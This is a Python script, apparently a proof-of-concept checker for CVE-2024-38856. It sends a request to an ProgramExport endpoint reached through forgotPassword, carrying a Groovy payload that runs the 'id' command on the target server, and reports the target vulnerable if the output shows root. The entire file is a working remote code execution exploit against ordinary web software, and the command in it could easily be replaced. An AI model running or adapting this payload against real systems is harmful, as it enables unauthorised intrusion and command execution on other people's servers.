import requests
import sys
import argparse
import base64
import urllib3

#Suppressing warnings related to insecure web requests in Python
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def checkVuln(targetURL):
    # Check if URL starts with http:// or https://
    if not (targetURL.startswith("http://") or targetURL.startswith("https://")):
        print("Error: URL must start with http:// or https://")
        sys.exit()
        
    checkurl = f"{targetURL}webtools/control/forgotPassword/ProgramExport?groovyProgram=throw+new+Exception('id'.execute().text)"
    response = requests.get(checkurl, timeout=7, verify=False)
    if response.status_code == 200 and 'uid=0' in response.text:
        print("\033[92m * Target is Vulnerable! \033[0m \n")

    else:
        print("Target is not vulnerable or not reachable :(")

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-38856")
    parser.add_argument("url", help="The target URL")
    args = parser.parse_args()
    
    try:
        return(checkVuln(args.url))
            
    except Exception as e:
        sys.exit(f"Some error occured: {e}")

if __name__ == "__main__":  
    main()
